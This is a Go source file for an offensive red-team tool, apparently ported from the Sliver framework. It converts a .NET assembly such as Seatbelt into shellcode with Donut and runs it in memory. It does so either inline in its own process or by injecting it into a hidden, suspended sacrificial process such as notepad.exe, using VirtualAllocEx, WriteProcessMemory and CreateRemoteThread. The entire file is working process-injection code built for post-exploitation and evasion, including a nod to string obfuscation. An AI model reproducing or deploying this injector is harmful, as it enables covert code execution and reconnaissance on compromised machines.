package main

import (
	"flag"
    "fmt"
	"os"
	"os/exec"
	"strings"
	"io/ioutil"
	"log"
	"bytes"
	"time"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
	"github.com/rawk77/goAssembly/syscalls"
	"github.com/rawk77/goAssembly/generate"
)

var (
	// ntdllPath       = "C:\\Windows\\System32\\ntdll.dll" // We make this a var so the string obfuscator can refactor it
	// kernel32dllPath = "C:\\Windows\\System32\\kernel32.dll"
	CurrentToken    windows.Token
	help = flag.Bool("help", false, "Show help")
	inlineFlag = flag.Bool("inline", false, "Execute Assembly in current process")
	filepath string
	arguments string
	process string
	inline bool
	
)

func parseFlags() {
	flag.StringVar(&filepath, "filePath", "Seatbelt.exe", "Path to the Assembly file")
	flag.StringVar(&arguments, "args", "OSInfo", "Args to pass to the assembly")
	flag.StringVar(&process, "process", "notepad.exe", "Process to inject into")
	flag.Parse()

	if *help {
		flag.Usage()
		os.Exit(0)
	}

	if *inlineFlag {
		inline = true
	}

	if len(filepath) == 0 {
		fmt.Printf("ERROR: Please provide a path to the assembly\n\n")
		flag.Usage()
		os.Exit(0)
	}
}

func main() {
	parseFlags()
	var assemblyPath string

	if !strings.Contains(filepath, "\\") {
		path, err := os.Getwd()
		if err != nil {
			fmt.Println(err)
		}
		assemblyPath = path + "\\" + filepath
	} else {
		assemblyPath = filepath
	}

	// Read the file into Bytes
	assemblyBytes, err := ioutil.ReadFile(assemblyPath)
	if err != nil {
		fmt.Printf("%s", err)
		return
	}

	assemblyArgsStr := strings.TrimSpace(arguments)

	// Read the file into Bytes
	donutBytes, err := generate.DonutFromAssembly(assemblyBytes, false, "amd64", assemblyArgsStr, "", "", "" )
	if err != nil {
		fmt.Printf("%s", err)
		return
	}

	log.Printf("Assembly Path supplied: %v\n", assemblyPath)
	log.Printf("Assembly Bin size: %v\n", len(assemblyBytes))
	log.Printf("Assembly Args supplied: %v\n", assemblyArgsStr)
	if inline != true {
		log.Printf("Process supplied: %v\n", process)
	}
	log.Printf("Inline Execution: %v\n", inline)

	if inline == true {
		resp, err := ExecuteInlineAssembly(donutBytes)
		if err != nil {
			fmt.Printf("%s", err)
			return
		}
		fmt.Println(resp)
	} else {
		resp, err := ExecuteAssembly(donutBytes, process)
		if err != nil {
			fmt.Printf("%s", err)
			return
		}
		fmt.Println(resp)
	}
}

// Execute Assembly in the current process
func ExecuteInlineAssembly(data []byte) (string, error) {
	var (
		stdoutBuf, stderrBuf bytes.Buffer
	)

	threadHandle, err := injectInlineTask(data, false)
	if err != nil {
		return "", err
	}

	// Wait for execution to finish
	_, _ = windows.WaitForSingleObject(windows.Handle(threadHandle), 0xFFFFFFFF)

	return stdoutBuf.String() + stderrBuf.String(), nil
}

// injectInlineTask - Injects shellcode into the current process handle
func injectInlineTask(data []byte, rwxPages bool) (windows.Handle, error) {
	var (
		err        error
		procAddr   uintptr
		threadHandle windows.Handle
	)
	dataSize := len(data)
	// Allocate memory in the target process
	log.Println("allocating process memory ...")
	if rwxPages {
		procAddr, err = syscalls.VirtualAlloc(uintptr(0), uintptr(uint32(dataSize)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	} else {
		procAddr, err = syscalls.VirtualAlloc(uintptr(0), uintptr(uint32(dataSize)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	}
	
	log.Printf("virtualalloc returned: procAddr = %#x, err = %v", procAddr, err)
	
	if err != nil {
		
		log.Println("[!] failed to allocate remote process memory")
		
		return threadHandle, err
	}

	// Write the shellcode into the remotely allocated buffer
	syscalls.RtlCopyMemory(procAddr, (uintptr)(unsafe.Pointer(&data[0])), uint32(dataSize))

	if !rwxPages {
		var oldProtect uint32
		// Set proper page permissions
		err = syscalls.VirtualProtect(procAddr, uintptr(uint(dataSize)), windows.PAGE_EXECUTE_READ, &oldProtect)
		if err != nil {
			log.Println("VirtualProtect failed:", err)
			return threadHandle, err
		}
	}
	// Create the remote thread to where we wrote the shellcode
	log.Println("successfully injected data, starting thread ....")
	
	attr := new(windows.SecurityAttributes)
	var lpThreadId uint32
	threadHandle, err = syscalls.CreateThread(attr, 0, procAddr, uintptr(0), 0, &lpThreadId)
	
	log.Printf("createthread returned:  err = %v", err)
	
	if err != nil {
		log.Printf("[!] failed to create remote thread")
		return  threadHandle, err
	}
	return  threadHandle, nil
}

// From Sliver... port to run standalone
func ExecuteAssembly(data []byte, process string) (string, error) {
	var (
		stdoutBuf, stderrBuf bytes.Buffer
		lpTargetHandle       windows.Handle
	)
	cmd, err := startProcess(process, &stdoutBuf, &stderrBuf, true)
	if err != nil {
		log.Println("Could not start process:", process)
		return "", err
	}
	pid := cmd.Process.Pid
	log.Printf("[*] %s started, pid = %d\n", process, pid)
	handle, err := windows.OpenProcess(syscalls.PROCESS_DUP_HANDLE, true, uint32(pid))
	if err != nil {
		return "", err
	}
	defer windows.CloseHandle(handle)
	defer windows.CloseHandle(lpTargetHandle)
	currentProcHandle, err := windows.GetCurrentProcess()
	if err != nil {
		log.Println("GetCurrentProcess failed")
		return "", err
	}
	err = windows.DuplicateHandle(handle, currentProcHandle, currentProcHandle, &lpTargetHandle, 0, false, syscalls.DUPLICATE_SAME_ACCESS)
	if err != nil {
		log.Println("DuplicateHandle failed")
		return "", err
	}
	threadHandle, err := injectTask(lpTargetHandle, data, false)
	if err != nil {
		return "", err
	}
	err = waitForCompletion(threadHandle)
	if err != nil {
		return "", err
	}
	err = cmd.Process.Kill()
	if err != nil {
		log.Printf("Kill failed: %s\n", err.Error())
	}
	return stdoutBuf.String() + stderrBuf.String(), nil
}

// injectTask - Injects shellcode into a process handle
func injectTask(processHandle windows.Handle, data []byte, rwxPages bool) (windows.Handle, error) {
	var (
		err          error
		remoteAddr   uintptr
		threadHandle windows.Handle
	)
	dataSize := len(data)
	// Remotely allocate memory in the target process
	log.Println("allocating remote process memory ...")
	if rwxPages {
		remoteAddr, err = syscalls.VirtualAllocEx(processHandle, uintptr(0), uintptr(uint32(dataSize)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	} else {
		remoteAddr, err = syscalls.VirtualAllocEx(processHandle, uintptr(0), uintptr(uint32(dataSize)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	}
	
	log.Printf("virtualallocex returned: remoteAddr = %#x, err = %v", remoteAddr, err)
	
	if err != nil {
		
		log.Println("[!] failed to allocate remote process memory")
		
		return threadHandle, err
	}

	// Write the shellcode into the remotely allocated buffer
	var nLength uintptr
	err = syscalls.WriteProcessMemory(processHandle, remoteAddr, &data[0], uintptr(uint32(dataSize)), &nLength)
	
	log.Printf("writeprocessmemory returned: err = %v", err)
	
	if err != nil {
		
		log.Printf("[!] failed to write data into remote process")
		
		return threadHandle, err
	}
	if !rwxPages {
		var oldProtect uint32
		// Set proper page permissions
		err = syscalls.VirtualProtectEx(processHandle, remoteAddr, uintptr(uint(dataSize)), windows.PAGE_EXECUTE_READ, &oldProtect)
		if err != nil {
			log.Println("VirtualProtectEx failed:", err)
			return threadHandle, err
		}
	}
	// Create the remote thread to where we wrote the shellcode
	log.Println("successfully injected data, starting remote thread ....")
	
	attr := new(windows.SecurityAttributes)
	var lpThreadId uint32
 	threadHandle, err = syscalls.CreateRemoteThread(processHandle, attr, uint32(0), remoteAddr, 0, 0, &lpThreadId)
	
	log.Printf("createremotethread returned:  err = %v", err)
	
	if err != nil {
		log.Printf("[!] failed to create remote thread")
		return threadHandle, err
	}
	return threadHandle, nil
}

func startProcess(proc string, stdout *bytes.Buffer, stderr *bytes.Buffer, suspended bool) (*exec.Cmd, error) {
	cmd := exec.Command(proc)
	cmd.SysProcAttr = &windows.SysProcAttr{
		Token: syscall.Token(CurrentToken),
	}
	cmd.Stdout = stdout
	cmd.Stderr = stderr
	cmd.SysProcAttr = &windows.SysProcAttr{
		HideWindow: true,
	}
	if suspended {
		cmd.SysProcAttr.CreationFlags = windows.CREATE_SUSPENDED
	}
	err := cmd.Start()
	if err != nil {
		log.Println("Could not start process:", proc)
		return nil, err
	}
	return cmd, nil
}

func waitForCompletion(threadHandle windows.Handle) error {
	for {
		var code uint32
		err := syscalls.GetExitCodeThread(threadHandle, &code)
		// log.Println(code)
		if err != nil && !strings.Contains(err.Error(), "operation completed successfully") {
			log.Printf("[-] Error when waiting for remote thread to exit: %s\n", err.Error())
			return err
		}
		log.Printf("[!] waitforCompletion Error: %v, code: %d\n", err, code)
		if code == syscalls.STILL_ACTIVE {
			time.Sleep(time.Second)
		} else {
			break
		}
	}
	return nil
}